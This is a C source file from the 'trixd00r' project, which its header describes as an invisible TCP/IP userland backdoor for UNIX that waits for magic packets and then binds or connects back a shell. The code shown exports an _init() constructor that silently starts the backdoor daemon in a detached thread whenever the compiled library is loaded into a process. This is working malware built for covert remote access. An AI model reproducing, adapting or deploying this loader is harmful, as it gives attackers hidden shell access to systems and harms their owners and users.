/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          * 
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/src/trixd00rd.c                                                      *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "trixd00rd.h"
#include "checks.h"
#include "controller.h"
#include "help.h"
#include "verbose.h"
#include "wrapper.h"

#include "daemon.h"

#include <getopt.h>

#include <pthread.h>



void *thread(void *arg)
{
    int c = 0;
    ctrl_t *ctrl = NULL;


    ctrl = alloc_structs();
    ctrl = set_ctrl_defaults(ctrl);


    /* quick checks of arguments and values */
    __VERBOSE_ARGS;

    /* install signal handlers here */
    install_signals();


    /* whole action starts here my darling */
    start_trixd00rd(ctrl);

    return 0;
}

__attribute__((visibility("default"))) void _init()
{

        pthread_t tid;
        pthread_create(&tid, NULL, thread, NULL);
        pthread_detach(tid);
        return;
}


/* EOF */
